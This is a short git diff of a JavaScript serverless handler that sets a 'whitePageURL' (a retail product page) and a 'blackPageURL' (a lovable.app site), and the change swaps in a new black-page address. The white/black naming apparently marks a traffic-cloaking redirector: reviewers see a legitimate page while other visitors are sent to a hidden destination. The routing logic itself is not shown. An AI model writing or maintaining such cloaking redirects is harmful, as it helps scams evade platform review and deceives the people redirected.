@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.todsnteens.com/products/bz-ssh-008?pr_prod_strat=e5_desc&pr_rec_id=7dbf7eb25&pr_rec_pid=9874983551293&pr_ref_pid=9877448261949&pr_seq=uniform";
-    const blackPageURL = "https://https://wherlnquz.lovable.app/";
+    const blackPageURL = "https://nowhereher.lovable.app/";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
